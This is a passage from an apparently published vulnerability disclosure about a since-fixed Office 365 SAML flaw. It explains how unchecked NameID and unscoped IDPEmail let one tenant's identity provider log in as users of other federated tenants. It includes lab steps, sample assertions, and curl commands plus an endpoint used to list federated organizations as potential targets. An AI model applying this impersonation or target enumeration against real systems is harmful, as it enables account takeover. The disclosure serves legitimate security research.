               &lt;span class="nt"&gt;&amp;lt;saml2:SubjectConfirmationData&lt;/span&gt; &lt;span class="na"&gt;Address=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2a02:214d:811b:7200:dc15:b7bc:a304:3738&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;InResponseTo=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_f6daef39-fb54-407e-abb4-c75d261b75ae&amp;quot;&lt;/span&gt;
                                              &lt;span class="na"&gt;NotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:19:35.384Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Recipient=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://login.microsoftonline.com/login.srf&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/saml2:SubjectConfirmation&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:Subject&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:Conditions&lt;/span&gt; &lt;span class="na"&gt;NotBefore=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:14:35.365Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:19:35.365Z&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:AudienceRestriction&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;saml2:Audience&amp;gt;&lt;/span&gt;urn:federation:MicrosoftOnline&lt;span class="nt"&gt;&amp;lt;/saml2:Audience&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/saml2:AudienceRestriction&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:Conditions&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:AuthnStatement&lt;/span&gt; &lt;span class="na"&gt;AuthnInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:14:35.027Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;SessionIndex=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_91380d0480ac9af6bcb19f3b26f0ea81&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:SubjectLocality&lt;/span&gt; &lt;span class="na"&gt;Address=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2a02:214d:811b:7200:dc15:b7bc:a304:3738&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:AuthnContext&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;saml2:AuthnContextClassRef&amp;gt;&lt;/span&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&lt;span class="nt"&gt;&amp;lt;/saml2:AuthnContextClassRef&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/saml2:AuthnContext&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:AuthnStatement&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:AttributeStatement&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:Attribute&lt;/span&gt; &lt;span class="na"&gt;FriendlyName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IDPEmail&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IDPEmail&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NameFormat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:attrname-format:uri&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
               &lt;span class="nt"&gt;&amp;lt;saml2:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
                                     &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xsd:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;ikakavas&amp;#64;mymail.example.com&lt;span class="nt"&gt;&amp;lt;/saml2:AttributeValue&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;/saml2:Attribute&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:AttributeStatement&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/saml2:Assertion&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/saml2p:Response&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The ImmutableId that uniquely identifies the user is in the Subject of the Assertion&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;saml2:Subject&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:NameID&lt;/span&gt; &lt;span class="na"&gt;Format=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:persistent&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;This is where my ImmutableId is&lt;span class="nt"&gt;&amp;lt;/saml2:NameID&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:SubjectConfirmation&lt;/span&gt; &lt;span class="na"&gt;Method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:SubjectConfirmationData&lt;/span&gt; &lt;span class="na"&gt;Address=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2a02:214d:811b:7200:dc15:b7bc:a304:3738&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;InResponseTo=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_f6daef39-fb54-407e-abb4-c75d261b75ae&amp;quot;&lt;/span&gt;
                                              &lt;span class="na"&gt;NotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-11T21:19:35.384Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Recipient=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://login.microsoftonline.com/login.srf&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:SubjectConfirmation&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/saml2:Subject&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and the IDPEmail that corresponds to the UPN of the existing account of the user in Azure AD is contained in the Attribute Statement&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;saml2:AttributeStatement&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml2:Attribute&lt;/span&gt; &lt;span class="na"&gt;FriendlyName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IDPEmail&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IDPEmail&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;NameFormat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:attrname-format:uri&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
           &lt;span class="nt"&gt;&amp;lt;saml2:AttributeValue&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
                                     &lt;span class="na"&gt;xsi:type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;xsd:string&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;ikakavas&amp;#64;mymail.example.com&lt;span class="nt"&gt;&amp;lt;/saml2:AttributeValue&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;/saml2:Attribute&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/saml2:AttributeStatement&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It can also be seen that both the SAML Response and the SAML Assertion are digitally signed.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="what-was-wrong-about-the-office-365-implentation"&gt;
&lt;h2&gt;What was wrong about the Office 365 Implentation?&lt;/h2&gt;
&lt;p&gt;In the process of integrating Office 365 as a Service Provider in the &lt;a class="reference external" href="https://aai.grnet.gr"&gt;Greek AAI Federation&lt;/a&gt; using the AAI365 solution that &lt;a class="reference external" href="http://www.sola-prihodnosti.si/en/"&gt;Šola prihodnosti Maribor&lt;/a&gt; offers we came up with some interesting flaws in how Microsoft implements the SAML Service Provider.&lt;/p&gt;
&lt;div class="section" id="what-about-saml-nameid"&gt;
&lt;h3&gt;What about SAML NameID?&lt;/h3&gt;
&lt;p&gt;The first thing we noticed is that Office 365 SAML Service Provider disregards the Subject of the Assertion, even though it contains the ImmutableId value that should be the UUID of the user in the Azure AD that would uniquely identify him.&lt;/p&gt;
&lt;p&gt;A name identifier, represented by the &amp;lt;NameID&amp;gt; element in SAML 2, is generally used to identify the subject of a SAML assertion. Name identifiers can be anything; an email address or a Kerberos principal name are common, every-day examples of such information. SAML 2 also defines more specialized identifier types with particular properties useful in federated applications. Strictly speaking, SAML assertions don't have to contain an identifier. The subject may be implicitly identified as the bearer of the token or anybody able to demonstrate possession of a key. In SSO use cases, one reason for including an identifier is to enable the relying party to refer to the subject later, such as in a query, or a logout request.&lt;/p&gt;
&lt;p&gt;From an attacker's perspective, the fact that the correctness of the NameID is not checked, makes things easier since the ImmutableID usually comes from AD objectGUID and it's hard to guess or bruteforce.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="scoping"&gt;
&lt;h3&gt;Scoping&lt;/h3&gt;
&lt;p&gt;That leaves the value of the IDPEmail attribute that corresponds to the UPN of the user in the Azure AD, as the sufficient piece of information to identify the user in the Assertion. Well, ok, this is not necessarily
bad in itself as the Assertion also contains the Issuer that generated and signed it, so an unrelated Identity Provider cannot create assertions for other domain's/tenant's users, right? Wrong.&lt;/p&gt;
&lt;p&gt;As it turns out, the Service Provider used the Issuer of the Assertion only to find the mathing certificate in order to verify the SAML Response/Assertion signature, but didn't perform any sanity checks on the supplied
value of the IDPEmail attribute. That basically means that it would happily consume assertions, asserting that Identity Provider X has authenticated users of Identity Provider Y.&lt;/p&gt;
&lt;p&gt;In SAML world this can be  mitigated with the help of scoped attributes. These are attributes that have 2 parts, a value and a scope in the format &lt;a class="reference external" href="mailto:value&amp;#64;scope"&gt;value&amp;#64;scope&lt;/a&gt;. The Identity Provider publishes the scope that it
is authoritative for in it's Metadata and Service Providers are supposed to check that when they consume a scoped attribute from an Identity Provider, they check that the scope that came matches the published one. UPN a.k.a. IDPEmail is scoped by definition as the domain part needs to be one of the (sub-)domains that the administrator has verified in an Office365 tenant.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="how-could-this-be-exploited"&gt;
&lt;h3&gt;How could this be exploited?&lt;/h3&gt;
&lt;p&gt;At the time of discovery we already had one Office 365 tenant setup as a playground for connecting Office 365 and SAML 2 identity providers. We had a basic Active Directory instance and &lt;a class="reference external" href="https://simplesamlphp.org/SimpleSAMLphp"&gt;SimpleSAMLphp&lt;/a&gt; as our Identity Provider.&lt;/p&gt;
&lt;p&gt;The first thing was setting up another organization playing a part of the victim in our experiments. This included a new Office 365 trial subscription and another SimpleSAMLphp instance with a different EntityID.&lt;/p&gt;
&lt;p&gt;Our testing enviroment therefore looked something like this:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;First Office 365 subscription with &lt;strong&gt;someorg-attacker.com&lt;/strong&gt; being authenticated at &lt;a class="reference external" href="http://idp.someorg-attacker.com/"&gt;http://idp.someorg-attacker.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Second Office 365 subscription with &lt;strong&gt;someorg-victim.com&lt;/strong&gt; being authenticated at &lt;a class="reference external" href="http://idp.someorg-victim.com/"&gt;http://idp.someorg-victim.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;At this point we had to add fake user accounts to &lt;em&gt;someorg-attacker's&lt;/em&gt; user directory and see what would happen when we try to login with them. With Active Directory this translates to adding a new &lt;em&gt;alternative UPN suffix&lt;/em&gt; and then adding new users via the included tools.&lt;/p&gt;
&lt;p&gt;The user directory at &lt;em&gt;someorg-victim&lt;/em&gt; contained entries for their own users:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Active Directory users (victim organization)" src="/images/ADusers-victim.png" /&gt;
&lt;/div&gt;
&lt;p&gt;The user directory at &lt;em&gt;someorg-attacker&lt;/em&gt; contained user entries for both organizations:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Active Directory users (attacker organization)" src="/images/ADusers-attacker.png" /&gt;
&lt;/div&gt;
&lt;p&gt;It was now time to test our hypothesis. As described above under &lt;a class="reference internal" href="#how-office-365-saml-implementation-works"&gt;How Office 365 SAML implementation works&lt;/a&gt;, the process started at &lt;cite&gt;https://login.microsoftonline.com/&lt;/cite&gt; and for the first step we had to use &lt;em&gt;something&amp;#64;someorg-attacker.com&lt;/em&gt; as the username for the login portal to redirect us to &lt;em&gt;someorg-attacker's&lt;/em&gt; Identity Provider.&lt;/p&gt;
&lt;p&gt;When presented with Identity Provider's login form we used one of our fake users created under &lt;em&gt;someorg-victim.com&lt;/em&gt; (e.g. &lt;a class="reference external" href="mailto:john.smith&amp;#64;someorg-victim.com"&gt;john.smith&amp;#64;someorg-victim.com&lt;/a&gt;) domain and happily finished our login process on the Identity Provider.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This was the critical point where things should simply stopped working and Microsoft's login portal should threw an error, yet nothing special happened.&lt;/strong&gt; We were welcomed by &lt;a class="reference external" href="http://portal.office.com/"&gt;Office Portal&lt;/a&gt; page logged in as &lt;em&gt;john.smith&amp;#64;someorg-victim.com&lt;/em&gt;. What followed was a moment of silence where we weren't sure whether to be happy about the discovery or terrified about its implications.&lt;/p&gt;
&lt;p&gt;For the first few minutes this looked like a critical vulnerability affecting only Microsoft's SAML 2.0 implementation and since SAML usually isn't the preferred Single Sign On protocol for Office 365, the actual number of affected Office 365 subscriptions seemed quite low and limited mostly to the educational sector.&lt;/p&gt;
&lt;p&gt;On the other hand, we had identified that the two SSO implementations are intertwined and that SAML 2.0 messages are translated to WS-Trust messages. So, this left us with  another open question - what happens if we try to login with a user that has its domain federated using &lt;a class="reference external" href="https://msdn.microsoft.com/en-us/library/bb897402.aspx"&gt;Active Directory Federations Services&lt;/a&gt;? Luckily, Šola prihodnosti Maribor (one of the partners in the discovery of this vulnerability, not a randomly selected victim) uses Office 365 with ADFS and it was therefore quite simple to answer this one. We added &lt;em&gt;klemen.bratec&amp;#64;spmb.si&lt;/em&gt; to our &lt;em&gt;someorg-attacker's&lt;/em&gt; user directory, repeated the procedure described above and &lt;strong&gt;it worked&lt;/strong&gt;! The SAML Service Provider consumed the SAML assertion from the attacker's org Identity Provider even though the spmb.si domain is configured to be federated with WS-Trust, forwarded it to the token translation service which translated it to an WS-Trust token and ... &lt;strong&gt;we were in&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now this is where things became really interesting as we were not limited to organizations using SAML and could login with almost any federated Office 365 user (the exception being those with enabled Multi-Factor Authentication).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="how-bad-was-it"&gt;
&lt;h3&gt;How bad was it?&lt;/h3&gt;
&lt;p&gt;Who is actually using Office 365 anyway? And out of them who has configured their domains as federated, thus being vulnerable? A quick search reveals &lt;a class="reference external" href="https://products.office.com/en-us/business/office-365-customer-stories-office-testimonials"&gt;this list&lt;/a&gt; of customer stories, which is not by any means exclusive. It contains&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
curl -s https://products.office.com/en-us/XMLData/PMG-CustomerStoryContent.xml?_=1460974613740 \
| xmlstarlet sel -t -v &amp;quot;count(/cusStoryTypes/cusStoryType/industry/story)&amp;quot;
&lt;/pre&gt;
&lt;p&gt;152 Customer stories&lt;/p&gt;
&lt;p&gt;Getting the customer names with&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
curl -s https://products.office.com/en-us/XMLData/PMG-CustomerStoryContent.xml?_=1460974613740 \
| xmlstarlet sel -t -n -v &amp;quot;/cusStoryTypes/cusStoryType/industry/story/companyName&amp;quot;
&lt;/pre&gt;
&lt;p&gt;reveals some interesting names such as &lt;a class="reference external" href="http://www.telefonika.com"&gt;telefonika&lt;/a&gt;, &lt;a class="reference external" href="http://www.caltex.com.au"&gt;Caltex Australia&lt;/a&gt;, &lt;a class="reference external" href="http://www.astonmartin.com"&gt;Aston Martin&lt;/a&gt;, &lt;a class="reference external" href="http://www.hellyhansen.com"&gt;Helly Hansen&lt;/a&gt;, &lt;a class="reference external" href="http://www.gsu.edu"&gt;Georgia State University&lt;/a&gt;, &lt;a class="reference external" href="http://www.jal.com"&gt;Japan Airlines&lt;/a&gt;, &lt;a class="reference external" href="http://www.sccgov.org"&gt;Santa Clara County&lt;/a&gt;, &lt;a class="reference external" href="http://www.cityofchicago.org"&gt;City of Chicago,IL&lt;/a&gt;, &lt;a class="reference external" href="http://www.ba.com"&gt;British Airways&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If only there was a way for an attacker to easily check which of these companies have their domain configured as federated... Scroll up a little to the &lt;a class="reference internal" href="#how-office-365-saml-implementation-works"&gt;How Office 365 SAML implementation works&lt;/a&gt; where we discussed how the Office 365 SAML Service Provider handles the IdP Discovery. Yes, it turns out that there is an endpoint that one can use to check if a domain is federated or not&lt;/p&gt;
&lt;p&gt;&lt;em&gt;https://login.microsoftonline.com/common/userrealm/?user=something&amp;#64;domain&amp;amp;api-version=2.1&amp;amp;checkForMicrosoftAccount=false&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;An HTTP GET request for a domain that is federated, returns the following json response&lt;/p&gt;
&lt;pre class="code json literal-block"&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;NameSpaceType&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Federated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;federation_protocol&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WSTrust&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;something&amp;#64;ba.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;AuthURL&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://sts.baplc.com/adfs/ls/?username=something%40ba.com&amp;amp;wa=wsignin1.0&amp;amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;amp;wctx=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;DomainName&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ba.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;FederationBrandName&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;BA.COM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;cloudinstancename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;login.microsoftonline.com&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;The response parameters that are of interest are&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;&lt;strong&gt;NameSpaceType&lt;/strong&gt; can be &lt;em&gt;Federated&lt;/em&gt; or &lt;em&gt;Managed&lt;/em&gt;. If the NameSpaceType is &lt;em&gt;Federated&lt;/em&gt;, the domain has been set for federated SSO and thus is vulnerable&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;federation_protocol&lt;/strong&gt; can be &lt;em&gt;WSTrust&lt;/em&gt; or &lt;em&gt;SAML20&lt;/em&gt; depending on how the SSO is configured. As shown above, both are vulnerable.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;dt&gt;Checking manually for a couple of the aforementioned companies reveals that&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.telefonika.com"&gt;telefonika&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.caltex.com.au"&gt;Caltex Australia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.gsu.edu"&gt;Georgia State University&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.jal.com"&gt;Japan Airlines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.sccgov.org"&gt;Santa Clara County&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.cityofchicago.org"&gt;City of Chicago,IL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.ba.com"&gt;British Airways&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;dt&gt;among others have their domains set as federated and thus were vulnerable. Additionally, some random checks against high profile targets showed that big organizations across various sectors use federated SSO with their Office365 subscriptions. Some prominent examples are in the list below&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.microsoft.com"&gt;Microsoft&lt;/a&gt; (well, duh)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.vodafone.com"&gt;Vodafone&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.bt.com"&gt;British Telecommunications plc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.verizon.com"&gt;Verizon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.imf.org"&gt;International Monetary Fund&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.shell.com"&gt;Royal Dutch Shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.dailymail.co.uk"&gt;The Daily Mail&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.novartis.com"&gt;Novartis Pharma AG&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.pfizer.com"&gt;Pfizer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.toyota.com"&gt;Toyota Motor North America&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.cisco.com"&gt;Cisco&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.ibm.com"&gt;IBM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.intel.com"&gt;Intel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.pwc.com"&gt;Pricewaterhouse Coopers (PwC)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.kpmg.com"&gt;KPMG&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.scania.com"&gt;Scania AB&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://www.vinci.com"&gt;Vinci&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;It was pretty easy to automate this and check against company domain name lists to identify potential targets, but we did not have the time nor the inclination to do so.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="outro"&gt;
&lt;h2&gt;Outro&lt;/h2&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;The aforementioned issue fell within the scope of the Online Service bug bounty program and as such has been rewarded and acknowledged by Microsoft on&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="https://technet.microsoft.com/en-us/security/dn469163"&gt;https://technet.microsoft.com/en-us/security/dn469163&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://technet.microsoft.com/en-us/security/cc308589.aspx"&gt;https://technet.microsoft.com/en-us/security/cc308589.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;div class="section" id="timeline"&gt;
&lt;h3&gt;Timeline&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;em&gt;2015-12   :&lt;/em&gt; Discovery and initial testing&lt;/li&gt;
&lt;li&gt;&lt;em&gt;2016-01-05:&lt;/em&gt; Disclosure to Microsoft&lt;/li&gt;
&lt;li&gt;&lt;em&gt;2016-01-05:&lt;/em&gt; Microsoft acknowledges the issue, mitigates it and rolls out an update in 7 hours (!!).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;2016-02-24:&lt;/em&gt; Microsoft closes the issue and allows us to publish the details.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;2016-04-27:&lt;/em&gt; Public disclosure&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
</summary><category term="SAML"></category><category term="office 365"></category><category term="impersonation"></category><category term="Single-Sign-On"></category></entry></feed>